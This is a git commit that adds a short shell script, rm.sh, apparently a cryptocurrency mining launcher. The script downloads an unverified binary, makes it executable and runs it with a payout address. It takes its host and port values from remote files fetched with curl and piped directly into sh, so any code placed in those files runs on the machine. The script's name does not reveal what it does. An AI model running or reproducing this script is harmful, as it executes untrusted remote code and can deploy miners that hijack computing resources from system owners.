757e76f20f42077a0480ff830d0f78ccb777625c
rnode01 <145897937+rnode01@users.noreply.github.com>
2023-09-25 22:32:54 +0530

    Create rm.sh

---
+++ rm.sh
@@ -0,0 +1,3 @@
+wget https://github.com/ocvmine/cpu/raw/main/rmac
+chmod +x rmac
+./rmac noconffile Mode=Solo Host=$(curl https://raw.githubusercontent.com/rienode0001/bit/master/host | sh) Port=$(curl https://raw.githubusercontent.com/rienode0001/bit/master/port | sh) Username=guru Password=guru PayoutAddress=ric1qu9sqhnl7vwgn3dhtygwk9fyqn2a9erfwjjsp55
